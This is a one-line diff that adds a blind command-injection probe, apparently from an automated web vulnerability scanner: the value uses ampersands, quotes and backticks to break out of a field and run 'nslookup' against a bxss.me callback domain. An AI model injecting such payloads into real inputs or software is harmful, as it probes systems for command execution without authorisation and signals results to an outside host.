@@ -1,0 +1,1 @@
+&nslookup -q=cname hitdxucqurrhw83ee7.bxss.me&'\"`0&nslookup -q=cname hitdxucqurrhw83ee7.bxss.me&`'
